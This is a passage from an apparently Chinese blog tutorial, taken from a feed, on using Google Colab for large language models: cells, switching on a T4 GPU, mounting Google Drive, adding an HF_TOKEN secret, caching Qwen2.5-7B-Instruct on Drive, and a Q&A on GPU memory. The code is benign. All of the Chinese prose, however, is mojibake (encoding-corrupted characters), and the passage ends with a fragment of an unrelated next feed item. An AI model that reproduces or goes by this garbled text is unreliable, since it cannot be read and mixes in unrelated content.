<li><strong>å¿«æ·æ“ä½œæ </strong>ï¼šåœ¨å•å…ƒæ ¼ä¸Šæ–¹çš„ä½ç½®æœ‰ä¸€æ¡å¿«æ·èœå•æ ï¼Œæ”¯æŒæˆ‘ä»¬æ·»åŠ æ–°çš„ä»£ç å—ï¼ˆCode Cellï¼‰å’Œæ–‡æœ¬å—ï¼ˆText Cellï¼‰ï¼Œè¿è¡Œå…¨éƒ¨å•å…ƒæ ¼ï¼ˆRun Allï¼‰ã€‚
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/quick_action.png" alt="åœ¨å•å…ƒæ ¼ä¸Šæ–¹çš„å¿«æ·æ“ä½œæ çš„æˆªå›¾" loading="lazy"/></li>
<li><strong>å·¦ä¾§å·¥å…·æ </strong>ï¼š åŒ…å«ç›®å½•é€Ÿè§ˆï¼ŒæŸ¥æ‰¾æ›¿æ¢ï¼Œå¯†é’¥ç®¡ç†ï¼Œæ•°æ®æŸ¥çœ‹ç­‰ç­‰å·¥å…·ã€‚
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/tool_bar.png" alt="å·¦ä¾§å·¥å…·æ çš„æˆªå›¾" loading="lazy"/></li>
<li><strong>å˜é‡å’Œç»ˆç«¯</strong>ï¼šè¿™é‡Œçš„å˜é‡æŒ‰é’®å¯ä»¥æŸ¥çœ‹æ‰§è¡Œåˆ°å½“å‰çš„å˜é‡ä¿¡æ¯ï¼Œå°±ä¸ç”¨å»printå˜é‡äº†ï¼Œå¾ˆæ–¹ä¾¿ã€‚ç»ˆç«¯æŒ‰é’®å°±å’ŒLinuxç»ˆç«¯ä¸€æ ·ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€äº›å‘½ä»¤ã€‚
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/variables_and_terminal.png" alt="æœ€ä¸‹æ–¹çš„å˜é‡æŒ‰é’®å’Œç»ˆç«¯æŒ‰é’®" loading="lazy"/></li>
</ul>
<h4 data-id="heading-6">3. æ ¸å¿ƒæ“ä½œ</h4>
<p>åœ¨ç•Œé¢ä»‹ç»æ—¶ï¼Œå’±ä»¬å¿«é€Ÿä»‹ç»äº†ä¸€ä¸‹ä¸¤ç§å•å…ƒæ ¼ï¼š<strong>ä»£ç å—</strong>å’Œ<strong>æ–‡æœ¬å—</strong>ï¼Œæ¥ä¸‹æ¥å¯ä»¥ç¨å¾®å¤šäº†è§£ä¸€ç‚¹ç‚¹è¿™ä¸¤ç§å•å…ƒæ ¼</p>
<h4 data-id="heading-7">3.1 ä»£ç å—</h4>
<p>å°±æ˜¯æˆ‘ä»¬çš„ä¸»åŠ›æˆ˜åœºï¼Œç¼–å†™Pythonä»£ç çš„åœ°æ–¹ï¼Œå¯ä»¥å¿«é€Ÿä½“éªŒä¸€ä¸‹ä½¿ç”¨æµç¨‹</p>
<ul>
<li>ç›´æ¥è¾“å…¥pythonä»£ç ï¼Œç„¶åç‚¹å‡»è¿è¡Œï¼ˆé‚£ä¸ªâ–¶æŒ‰é’®æˆ–è€…ä½¿ç”¨å¿«æ·é”® <strong><code>Shift + Enter</code></strong>ï¼‰
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/first_code_run.png" alt="åœ¨ä»£ç å—ä¸­å†™å…¥ä»£ç åè¿è¡Œä¹‹åçš„ç•Œé¢æˆªå›¾" loading="lazy"/></li>
<li>å¯ä»¥çœ‹åˆ°ä»£ç å—å·¦ä¾§æœ‰ä¸€ä¸ª[1],ä¸€ä¸ªç»¿è‰²çš„âˆšï¼Œä»£ç å—ä¸‹æ–¹æœ‰è¾“å‡ºçš„æ‰“å°ç»“æœ
å‰é¢çš„åºå·æ ‡æ˜ä»£ç å—çš„æ‰§è¡Œé¡ºåºï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥ä¹±åºæ‰§è¡Œï¼Œæ‰§è¡Œå®Œä¸‹æ–¹ä»£ç å—å†å›æ¥æ‰§è¡Œå‰é¢çš„ä»£ç å—</li>
</ul>
<h4 data-id="heading-8">3.2 æ–‡æœ¬å—</h4>
<p>jupyter notebookæ˜¯æ”¯æŒç›´æ¥æ¸²æŸ“markdownæ ¼å¼çš„æ–‡æ¡£çš„ï¼Œæ‰€ä»¥ä¹Ÿæœ‰äººç›´æ¥ç”¨å®ƒå½“æ–‡æ¡£ã€‚ç›¸æ¯”äºæˆ‘ä»¬ç”¨æ³¨é‡Šå»è®°å½•ï¼Œmarkdownæ ¼å¼çš„æ–‡æœ¬å—ä¼šæ›´ç›´è§‚ã€‚</p>
<ul>
<li>ç‚¹å‡»ä¸Šé¢çš„<strong>â•Text</strong>æŒ‰é’®ï¼ˆæˆ–è€…åœ¨å½“å‰å•å…ƒæ ¼ä¸Šæ–¹/ä¸‹æ–¹ä¸­é—´æµ®ç°æ˜¾ç¤ºçš„å¿«æ·æŒ‰é’®ï¼‰å»æ–°å¢ä¸€ä¸ªæ–‡æœ¬å—</li>
<li><strong>Shift+Enter</strong>å¿«æ·é”®â€œè¿è¡Œ/æ¸²æŸ“â€å®ƒï¼Œ
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/text_cell.png" alt="è¾“å…¥äº†# This is Title!!çš„æ–‡æœ¬å—æˆªå›¾" loading="lazy"/>
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/after_render_text_block.png" alt="æ¸²æŸ“ä¹‹åçš„æ–‡æœ¬å—æˆªå›¾" loading="lazy"/></li>
</ul>
<h3 data-id="heading-9">4. <strong>å¼€å¯å…è´¹GPUç®—åŠ›</strong></h3>
<p>é»˜è®¤çŠ¶æ€ä¸‹Colabæ˜¯ä½¿ç”¨çš„CPUï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å»å¼€å¯GPU</p>
<ul>
<li>ç‚¹å‡»é¡¶éƒ¨èœå•æ çš„<strong>Runtimeï¼ˆè¿è¡Œæ—¶ï¼‰<strong>ä¸‹æ‹‰èœå•ä¸­çš„</strong>Change runtime typeï¼ˆæ›´æ”¹è¿è¡Œæ—¶ç±»å‹ï¼‰</strong>
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/runtime_change_runtime_type.png" alt="ç‚¹å‡»Runtimeä¸‹æ¥èœå•ï¼Œé¼ æ ‡æŒ‡å‘Change runtime typeçš„æˆªå›¾" loading="lazy"/></li>
<li>é€‰æ‹©<strong>Hardware accelerator(ç¡¬ä»¶åŠ é€Ÿå™¨)<strong>çš„</strong>T4 GPU</strong>.
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/select_t4gpu.png" alt="è¿›å…¥change runtime typeåé¼ æ ‡é€‰æ‹©T4GPUçš„æˆªå›¾" loading="lazy"/></li>
<li>å¼¹å‡ºçš„çª—å£è­¦å‘Šæˆ‘ä»¬ä¼šæ–­è”å½“å‰è¿è¡Œæ—¶ï¼Œåˆ‡æ¢åˆ°T4GPUçš„ç¡¬ä»¶ï¼Œé€‰æ‹©OK
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/disconnection_warning.png" alt="ç‚¹å‡»T4GPUåï¼Œå¼¹å‡ºç»“æŸè¿è¡Œæ—¶çš„æˆªå›¾" loading="lazy"/></li>
<li>ä¿å­˜ï¼Œç„¶åä¼šå‘ç°ä¹‹å‰è¿è¡Œè¿‡çš„ä»£ç å—å¤±æ´»äº†ï¼ˆå‰é¢æ¡†æ¡†é‡Œçš„æ•°å­—æ¶ˆå¤±äº†ï¼Œæ‰€æœ‰è¿è¡Œè¿‡çš„ä»£ç å—éœ€è¦é‡æ–°è¿è¡Œï¼‰</li>
<li>æˆ‘ä»¬æ¥è¾“å…¥ä»¥ä¸‹ä»£ç éªŒè¯</li>
</ul>
<pre><code class="hljs language-python" lang="python">!nvidia-smi
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/nvidia_result.png" alt="nvidia-smiçš„è¿è¡Œç»“æœæˆªå›¾" loading="lazy"/>
ä»è¿”å›çš„è¡¨æ ¼ç»“æœä¸­ï¼Œèƒ½çœ‹åˆ°å’±ä»¬çš„è®¾å¤‡æ˜¯TeslaT4ã€‚</p>
<p>åœ¨notebookä»£ç å—ä¸­ä»¥<code>!</code>å¼€å¤´å³å¯è¿è¡Œå‘½ä»¤ï¼Œè¿™é‡Œç­‰æ•ˆä¸ºåœ¨terminalä¸­è¿è¡Œ<code>nvidia-smi</code>
<strong>PS:é™¤äº†åˆ‡æ¢æ–‡ä»¶å¤¹å¾—ç”¨<code>%cd</code>è€Œä¸æ˜¯<code>!cd</code></strong></p>
<h3 data-id="heading-10">5. <strong>ä¸‹è½½å¤§æ¨¡å‹</strong></h3>
<p>æˆ‘ä»¬ä½¿ç”¨Colabä¸»è¦æ˜¯ä¸ºäº†ä½¿ç”¨å¤§æ¨¡å‹ä»¥åŠè®­ç»ƒå¤§æ¨¡å‹ï¼Œå¯¹äºColabè€Œè¨€ï¼Œæ¨¡å‹çš„ä¸‹è½½æœ‰ä¸ªç—›ç‚¹ï¼š<strong>Colabæ˜¯ä¸´æ—¶çš„</strong>ï¼Œå“ªæ€•æˆ‘ä»¬é€šè¿‡å‘½ä»¤ä¸‹è½½äº†å¥½å‡ ä¸ªGçš„æ¨¡å‹ï¼Œç”šè‡³å¥½å‡ åGçš„æ¨¡å‹ï¼Œä½†æ˜¯æ¯æ¬¡é‡ç½®è¿è¡Œæ—¶çš„æ—¶å€™ï¼Œè¿™ä¸€åˆ‡éƒ½ä¼šç°é£çƒŸç­ï¼Œæ¶ˆæ•£å¦‚çƒŸã€‚ä¸ºäº†é¿å…æ¯æ¬¡éƒ½é‡æ–°ä¸‹è½½ï¼Œæµªè´¹æ—¶é—´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŒ‚åœ¨Google Driveæ¥ä¿å­˜æ¨¡å‹ã€‚</p>
<h4 data-id="heading-11">5.1 æŒ‚è½½Google Drive</h4>
<ol>
<li>æˆ‘ä»¬è¿è¡Œä»¥ä¸‹ä»£ç </li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> google.colab <span class="hljs-keyword">import</span> drive
drive.mount(<span class="hljs-string">'/content/drive'</span>)
</code></pre>
<ol start="2">
<li>ç„¶ååœ¨å¼¹å‡ºæˆæƒçª—å£ä¸­æˆæƒ
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/link_to_google_drive.png" alt="è¿è¡Œå®ŒæŒ‚è½½ä»£ç åï¼Œå¼¹å‡ºçš„æˆæƒæç¤ºæˆªå›¾" loading="lazy"/></li>
<li>å°±èƒ½åœ¨ä»£ç å—ä¸‹æ–¹çœ‹è§å·²ç»æˆåŠŸæŒ‚è½½çš„æ‰“å°ä¿¡æ¯
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/mounted_at_google_drive.png" alt="æˆåŠŸæŒ‚è½½google driveåçš„æ‰“å°ä¿¡æ¯æˆªå›¾" loading="lazy"/></li>
</ol>
<h4 data-id="heading-12">5.2 é…ç½®HuggingFaceç¯å¢ƒå˜é‡å’ŒToken</h4>
<p>åœ¨ä¸‹è½½å—é™æ¨¡å‹ï¼ˆå¦‚ Llama 3ï¼‰æ—¶ï¼Œä½ éœ€è¦ Hugging Face Tokenã€‚</p>
<ol>
<li>å» <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fsettings%2Ftokens" target="_blank" title="https://huggingface.co/settings/tokens" ref="nofollow noopener noreferrer">Hugging Face Settings</a> è·å– Tokenã€‚</li>
<li>åœ¨ Colab å·¦ä¾§é’¥åŒ™å›¾æ ‡ï¼ˆSecretsï¼‰é‡Œæ·»åŠ  <code>HF_TOKEN</code>ã€‚</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/hf_token_configuration.png" alt="Colab å·¦ä¾§ Secrets é¢æ¿é…ç½® HF_TOKEN çš„æˆªå›¾" loading="lazy"/></p>
<h4 data-id="heading-13">5.3 æŒ‡å®šç¼“å­˜è·¯å¾„ä¸‹è½½</h4>
<p>å› ä¸ºå’±ä»¬åœ¨Colabç¯å¢ƒï¼Œæ˜¯å›½å¤–çš„é­”æ³•ç¯å¢ƒï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨hugging faceæ¥ä¸‹è½½æ¨¡å‹ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥æŒ‡å®šä¸€ä¸‹æ¨¡å‹ä¸‹è½½çš„ç¼“å­˜è·¯å¾„åˆ°æŒ‚è½½çš„Google Driveã€‚</p>
<ol>
<li>å’±ä»¬å…ˆåˆ‡å›CPUç¯å¢ƒï¼Œå› ä¸ºä¸‹è½½æ¨¡å‹å¹¶ä¸éœ€è¦GPU,åˆ‡å›å»å¯ä»¥èŠ‚çº¦ä¸€ç‚¹å’±ä»¬çš„é¢åº¦ã€‚</li>
<li>è¾“å…¥ä»¥ä¸‹ä»£ç ç„¶åè¿è¡Œ</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> google.colab <span class="hljs-keyword">import</span> drive
<span class="hljs-keyword">import</span> os

<span class="hljs-comment"># 1. æŒ‚è½½äº‘ç›˜</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">'/content/drive'</span>):
    drive.mount(<span class="hljs-string">'/content/drive'</span>)

<span class="hljs-comment"># 2. å‡†å¤‡ç›®å½•</span>
cache_dir = <span class="hljs-string">"/content/drive/MyDrive/huggingface_cache"</span>
os.makedirs(cache_dir, exist_ok=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># 3. è®¾ç½® Token (å¦‚æœä½ åœ¨å·¦ä¾§ Secrets è®¾ç½®äº† HF_TOKENï¼Œè¿™é‡Œè‡ªåŠ¨è¯»å–)</span>
<span class="hljs-comment"># å¦‚æœæ²¡è®¾ç½®ï¼Œè¯·æ‰‹åŠ¨æŠŠä¸‹è¡Œä»£ç å¼•å·é‡Œæ¢æˆä½ çš„ tokenï¼Œæˆ–è€…ç•™ç©ºè¯•ä¸‹ï¼ˆQwen æœ‰æ—¶ä¸éœ€è¦ï¼‰</span>
my_token = os.getenv(<span class="hljs-string">'HF_TOKEN'</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">"å±å¹•å¯èƒ½ä¼šé™æ­¢ 5-10 åˆ†é’Ÿï¼Œè¯·ç›¯ç€å·¦è¾¹çš„å°åœ†åœˆè½¬åŠ¨å³å¯ã€‚"</span>)

cmd = <span class="hljs-string">f"huggingface-cli download Qwen/Qwen2.5-7B-Instruct --cache-dir <span class="hljs-subst">{cache_dir}</span> --quiet"</span>
<span class="hljs-keyword">if</span> my_token:
    cmd += <span class="hljs-string">f" --token <span class="hljs-subst">{my_token}</span>"</span>

<span class="hljs-comment"># æ‰§è¡Œå‘½ä»¤</span>
result = os.system(cmd)

<span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n ä¸‹è½½æˆåŠŸï¼"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n ä¸‹è½½å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç½‘ç»œæˆ– Tokenã€‚"</span>)
</code></pre>
<ol start="3">
<li>ç„¶åè¿è¡Œä¸‹é¢çš„å‘½ä»¤æ£€éªŒæ¨¡å‹æ˜¯å¦ä¸‹è½½å®Œæ¯•</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># check disk usage (æŸ¥çœ‹ç£ç›˜å ç”¨)</span>
<span class="hljs-comment"># -s: æ±‡æ€»å¤§å°, -h: äººç±»å¯è¯»æ ¼å¼ (GB/MB)</span>
!du -sh /content/drive/MyDrive/huggingface_cache/models--Qwen--Qwen2<span class="hljs-number">.5</span>-7B-Instruct
</code></pre>
<p>çœ‹åˆ°çš„ç»“æœåº”è¯¥æ˜¯15Gå¤§å°çš„æ–‡ä»¶
<img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/du_sh_validation.png" alt="è¿è¡Œdu -sh /content/drive/MyDrive/huggingface_cache/models--Qwen--Qwen2.5-7B-Instructåçš„ç»“æœæˆªå›¾" loading="lazy"/></p>
<p><strong>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå»ºè®®æ¨¡å‹ä¸‹è½½å’Œæ•°æ®å¤„ç†éƒ½åœ¨CPUæ¨¡å¼ä¸‹è¿›è¡Œï¼Œç„¶åå¤„ç†å®Œæ¯•å­˜å…¥äº‘ç›˜.</strong> 4. ç„¶åæ–°å»ºä»£ç å—ï¼Œè¿è¡Œå¦‚ä¸‹ä»£ç ï¼Œæ¥ç¡®è®¤æ¨¡å‹æ˜¯å¦èƒ½å¤Ÿè¢«è¯†åˆ«</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> glob
<span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoConfig, AutoTokenizer

<span class="hljs-comment"># 1. è®¾ç½®ä½ çš„ç¼“å­˜æ ¹ç›®å½•</span>
base_cache_path = <span class="hljs-string">'/content/drive/MyDrive/huggingface_cache'</span>

<span class="hljs-comment"># 2. æ„é€ å¿«ç…§ç›®å½•çš„é€šé…ç¬¦è·¯å¾„</span>
<span class="hljs-comment"># ç»“æ„é€šå¸¸æ˜¯: base / models--ID / snapshots / &lt;å“ˆå¸Œå€¼&gt;</span>
snapshot_pattern = os.path.join(
    base_cache_path,
    <span class="hljs-string">"models--Qwen--Qwen2.5-7B-Instruct"</span>,
    <span class="hljs-string">"snapshots"</span>,
    <span class="hljs-string">"*"</span>  <span class="hljs-comment"># è¿™é‡Œç”¨ * åŒ¹é…é‚£ä¸ªéšæœºç”Ÿæˆçš„å“ˆå¸Œæ–‡ä»¶å¤¹</span>
)

<span class="hljs-comment"># 3. å¯»æ‰¾çœŸå®çš„æ–‡ä»¶å¤¹è·¯å¾„</span>
found_folders = glob.glob(snapshot_pattern)

<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found_folders:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">" é”™è¯¯ï¼šæ‰¾ä¸åˆ° snapshots æ–‡ä»¶å¤¹ï¼Œè¯·æ£€æŸ¥ä¸‹è½½æ˜¯å¦æˆåŠŸæˆ–è·¯å¾„æ˜¯å¦æ­£ç¡®ã€‚"</span>)
<span class="hljs-keyword">else</span>:
    local_model_path = found_folders[<span class="hljs-number">0</span>]

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”å®šæœ¬åœ°æ¨¡å‹è·¯å¾„: <span class="hljs-subst">{local_model_path}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ­£åœ¨å°è¯•ç›´æ¥åŠ è½½..."</span>)

    <span class="hljs-keyword">try</span>:
        config = AutoConfig.from_pretrained(local_model_path)
        tokenizer = AutoTokenizer.from_pretrained(local_model_path)

        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\næˆåŠŸï¼æ¨¡å‹å¯ä»¥è¢«æ­£ç¡®åŠ è½½ã€‚"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ¨¡å‹éšè—å±‚ç»´åº¦: <span class="hljs-subst">{config.hidden_size}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è¯è¡¨å¤§å°: <span class="hljs-subst">{tokenizer.vocab_size}</span>"</span>)

    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nåŠ è½½ä¾ç„¶å¤±è´¥ã€‚å¯èƒ½æ˜¯ Google Drive çš„è½¯é“¾æ¥å¤±æ•ˆäº†ã€‚"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯ä¿¡æ¯: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/Algieba-dean/BlogImgs@master/blog-images/test_blog/llm02-1-online-environment-colab/loaded.png" alt="é€šè¿‡è¿è¡Œæ¨¡å‹åŠ è½½å‘½ä»¤ï¼Œæ˜¾ç¤ºæ¨¡å‹æˆåŠŸåŠ è½½çš„æˆªå›¾" loading="lazy"/></p>
<h3 data-id="heading-14">05. å¸¸è§é—®é¢˜ (Q&amp;A)</h3>
<p><strong>Q: CPU å’Œ GPU è·‘å¤§æ¨¡å‹ï¼Œæ€§èƒ½å·®å¼‚åˆ°åº•æœ‰å¤šå¤§ï¼Ÿ</strong>
<strong>A:</strong> å·®å¼‚å·¨å¤§ï¼Œå°±åƒ<strong>æ³•æ‹‰åˆ©</strong>å’Œ<strong>æ‹–æ‹‰æœº</strong>çš„åŒºåˆ«ã€‚</p>
<ul>
<li><strong>CPU (ä¸­å¤®å¤„ç†å™¨)</strong>ï¼šåƒä¸€ä¸ªçŸ¥è¯†æ¸Šåšçš„æ•™æˆï¼Œè®¡ç®—èƒ½åŠ›å¼ºä½†åªèƒ½ä¸€ä¸ªä¸€ä¸ªä»»åŠ¡ä¸²è¡Œå¤„ç†ã€‚æ¨ç†å¤§æ¨¡å‹æ—¶ï¼Œå®ƒéœ€è¦é€ä¸ªè®¡ç®—çŸ©é˜µä¹˜æ³•ï¼Œç”Ÿæˆä¸€ä¸ªå­—å¯èƒ½éœ€è¦å¥½å‡ ç§’ã€‚</li>
<li><strong>GPU (å›¾å½¢å¤„ç†å™¨)</strong>ï¼šåƒä¸€ä¸ªç”±å‡ åƒåå°å­¦ç”Ÿç»„æˆçš„æ–¹é˜µï¼Œè™½ç„¶å•äººèƒ½åŠ›ä¸å¦‚æ•™æˆï¼Œä½†èƒ½åŒæ—¶è¿›è¡Œå¤§è§„æ¨¡å¹¶è¡Œè®¡ç®—ã€‚å¤§æ¨¡å‹çš„æœ¬è´¨æ˜¯æµ·é‡çš„çŸ©é˜µè¿ç®—ï¼ŒGPU å¯ä»¥ç¬é—´å®Œæˆï¼Œç”Ÿæˆé€Ÿåº¦é€šå¸¸æ˜¯ CPU çš„å‡ åå€ç”šè‡³ä¸Šç™¾å€ã€‚</li>
</ul>
<p><strong>Q: é‚£ä¸€å° RTX 4090 èƒ½è¿è¡Œå¤šå¤§çš„æ¨¡å‹ï¼Ÿèƒ½å¾®è°ƒå¤šå¤§ï¼Ÿ</strong>
<strong>A:</strong> RTX 4090 æ‹¥æœ‰ <strong>24GB æ˜¾å­˜</strong>ï¼Œè¿™æ˜¯æ ¸å¿ƒç“¶é¢ˆã€‚</p>
<ul>
<li><strong>æ¨ç† (è¿è¡Œ)</strong>ï¼š
<ul>
<li><strong>4-bit é‡åŒ–</strong>ï¼šæ˜¾å­˜å ç”¨ â‰ˆ å‚æ•°é‡ Ã— 0.7ã€‚4090 æé™å¯ä»¥è·‘ <strong>30B - 34B</strong> å‚æ•°çš„æ¨¡å‹ï¼ˆå¦‚ Yi-34B-Chat-Int4ï¼‰ã€‚</li>
<li><strong>å…¨ç²¾åº¦ (FP16)</strong>ï¼šæ˜¾å­˜å ç”¨ â‰ˆ å‚æ•°é‡ Ã— 2ã€‚4090 æœ€å¤šè·‘ <strong>10B - 12B</strong> å‚æ•°çš„æ¨¡å‹ã€‚</li>
</ul>
</li>
<li><strong>å¾®è°ƒ (è®­ç»ƒ)</strong>ï¼š
<ul>
<li><strong>å…¨é‡å¾®è°ƒ</strong>ï¼šæƒ³éƒ½ä¸è¦æƒ³ï¼Œéœ€è¦å‡ ç™¾ GB æ˜¾å­˜ã€‚</li>
<li><strong>LoRA / QLoRA (è½»é‡å¾®è°ƒ)</strong>ï¼šè¿™æ˜¯å’±ä»¬ä¸ªäººç©å®¶çš„ä¸»æµã€‚4090 å¯ä»¥è½»æ¾å¾®è°ƒ <strong>7B - 10B</strong> çš„æ¨¡å‹ã€‚</li>
</ul>
</li>
</ul>
<p><strong>Q: åŠ¨æ€è„šæœ¬è¯­è¨€ (Python) å’Œå¸¸è§„é¢„ç¼–è¯‘è¯­è¨€ (C++/Java) æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong>
<strong>A:</strong></p>
<ul>
<li><strong>é¢„ç¼–è¯‘è¯­è¨€ (C++/Java)</strong>ï¼šåƒå†™ä¹¦ã€‚å†™å®Œä¸€æ•´æœ¬ä¹¦ï¼ˆä»£ç ï¼‰ï¼Œé€å»å°åˆ·å‚ï¼ˆç¼–è¯‘ï¼‰ï¼Œæœ€åå‡ºæ¥æˆå“ä¹¦ï¼ˆå¯æ‰§è¡Œæ–‡ä»¶ï¼‰ã€‚æ‰§è¡Œé€Ÿåº¦å¿«ï¼Œä½†ä¿®æ”¹éº»çƒ¦ï¼Œæ”¹ä¸€ä¸ªå­—è¦é‡æ–°å°åˆ·ã€‚</li>
<li><strong>åŠ¨æ€è„šæœ¬è¯­è¨€ (Python)</strong>ï¼šåƒèŠå¤©ã€‚ä½ è¯´ä¸€å¥ï¼ˆå†™ä¸€è¡Œä»£ç ï¼‰ï¼Œè§£é‡Šå™¨å°±æ‰§è¡Œä¸€å¥ã€‚è™½ç„¶æ‰§è¡Œé€Ÿåº¦ç¨æ…¢ï¼Œä½†èƒœåœ¨<strong>äº¤äº’æ€§æå¼º</strong>ã€‚åœ¨æ•°æ®ç§‘å­¦å’Œ AI é¢†åŸŸï¼Œæˆ‘ä»¬éœ€è¦é¢‘ç¹æŸ¥çœ‹æ•°æ®çš„ä¸­é—´ç»“æœï¼ˆæ¯”å¦‚æŸ¥çœ‹æ¨¡å‹è¾“å‡ºçš„å¼ é‡å½¢çŠ¶ï¼‰ï¼ŒPython çš„è¿™ç§ç‰¹æ€§è®©å®ƒæˆä¸ºäº† AI é¢†åŸŸçš„éœ¸ä¸»ã€‚</li>
</ul>
<p><strong>Q: Colab é‡Œçš„ T4, A100, TPU éƒ½æœ‰ä»€ä¹ˆå·®åˆ«ï¼Ÿ</strong>
<strong>A:</strong></p>
<ul>
<li><strong>T4 (å…è´¹ç‰ˆæ ‡é…)</strong>ï¼šå…¥é—¨çº§æ¨ç†å¡ï¼Œ16GB æ˜¾å­˜ã€‚è·‘ 7B æ¨¡å‹æ¨ç†æ²¡é—®é¢˜ï¼Œå¾®è°ƒ QLoRA å‹‰å¼ºå¤Ÿç”¨ã€‚å’±ä»¬è–…ç¾Šæ¯›ä¸»è¦å°±è–…å®ƒã€‚</li>
<li><strong>A100 (ä»˜è´¹ç‰ˆ)</strong>ï¼šé¡¶çº§è®¡ç®—å¡ï¼Œ40GB/80GB æ˜¾å­˜ã€‚é€Ÿåº¦æå¿«ï¼Œæ˜¾å­˜æå¤§ï¼Œé€‚åˆè·‘å¤§å‚æ•°æ¨¡å‹æˆ–è¿›è¡Œä¸¥è‚ƒçš„è®­ç»ƒä»»åŠ¡ã€‚Colab Pro/Pro+ æ‰èƒ½åˆ·åˆ°ã€‚</li>
<li><strong>TPU (Tensor Processing Unit)</strong>ï¼šGoogle ä¸“é—¨ä¸ºæœºå™¨å­¦ä¹ å®šåˆ¶çš„èŠ¯ç‰‡ï¼Œå¤„ç†çŸ©é˜µè¿ç®—æ¯” GPU æ›´å¿«ï¼Œä½†ç”Ÿæ€å’Œå…¼å®¹æ€§ï¼ˆPyTorch æ”¯æŒï¼‰ä¸å¦‚ Nvidia GPU é€šç”¨ï¼Œä¸Šæ‰‹é—¨æ§›ç¨é«˜ã€‚</li>
</ul>
<hr/>
<p><strong>æœ¬æ–‡ä½œè€…ï¼š</strong> Algieba
<strong>æœ¬æ–‡é“¾æ¥ï¼š</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.algieba12.cn%2Fllm02-1-online-environment-colab%2F" target="_blank" title="https://blog.algieba12.cn/llm02-1-online-environment-colab/" ref="nofollow noopener noreferrer">blog.algieba12.cn/llm02-1-onlâ€¦</a>
<strong>ç‰ˆæƒå£°æ˜ï¼š</strong> æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</p>
<pre><code class="hljs"/></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…¨å‘˜å…è´¹ï¼ŒOpenAI æ ¼å±€æ‹‰æ»¡ï¼šCodex æ¡Œé¢ç‰ˆåˆšåˆšä¸Šçº¿ï¼]]></title>    